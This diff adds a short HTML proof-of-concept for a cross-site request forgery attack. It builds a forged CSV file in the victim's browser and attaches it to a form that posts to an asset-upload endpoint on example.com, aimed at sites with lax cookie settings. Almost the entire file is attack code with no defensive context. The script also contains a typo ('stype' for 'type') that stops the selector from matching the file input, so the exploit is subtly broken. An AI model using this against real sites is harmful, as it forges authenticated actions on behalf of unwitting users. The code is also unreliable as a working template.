@@ -1,0 +1,26 @@
+
+
+CSRF WITH FORM + FILE UPLOAD POST METHOND WHILE COOKIE IS LAX:
+
+
+<html>
+  <body>
+    <form action="https://example.com/api/easm/assets/upload_csv" method="POST" enctype="multipart/form-data">
+      <input type="file" name="csv&#95;file"/>
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+    // Get a reference to our file input
+    const fileInput = document.querySelector('input[stype="file"]');
+
+    // Create a new File object
+    const myFile = new File(['asset type,asset value,importance,monitored,subtype\r\nalias,CSRF,high,TRUE,,'], 'myFile.csv', {type: 'text/csv',lastModified: new Date(),});
+
+    // Now let's create a DataTransfer to get a FileList
+    const dataTransfer = new DataTransfer();
+    dataTransfer.items.add(myFile);
+    fileInput.files = dataTransfer.files;
+
+</script>
+  </body>
+</html>
